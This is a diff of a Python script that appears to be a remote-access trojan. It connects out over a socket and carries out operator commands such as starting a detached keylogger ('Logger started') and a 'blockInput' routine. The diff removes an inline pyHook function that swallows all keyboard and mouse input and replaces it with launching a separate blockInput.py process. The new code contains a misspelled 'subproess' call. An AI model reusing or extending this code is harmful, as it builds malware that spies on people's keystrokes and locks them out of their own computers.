@@ -11,17 +11,6 @@ import time
 HOST = '127.0.0.1'   
 PORT = 22
 
-def setBlock(event):    
-    return False    
-    
-def blockInput():    
-    hookManager = pyHook.HookManager()    
-    hookManager.MouseAll = setBlock    
-    hookManager.KeyAll = setBlock    
-    hookManager.HookMouse()    
-    hookManager.HookKeyboard()    
-    pythoncom.PumpMessages()    
-    
 def connect((host, port)):
 	socketHolder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	socketHolder.connect((host, port))
@@ -42,7 +31,11 @@ def run_shell_cmd(socketHolder):
                 creationflags=DETACHED_PROCESS).pid
             socketHolder.send('Logger started')
         elif data == 'blockInput':
-            blockInput()
+            CREATE_NEW_PROCESS_GROUP = 0x00000200
+            DETACHED_PROCESS = 0x00000008
+            pid = subproess.Popen([sys.executable, "blockInput.py"],
+                creationflags=DETACHED_PROCESS).pid
+            socketHolder.send('Block Input started')
         elif len(data) == 0:
             return True
         else:
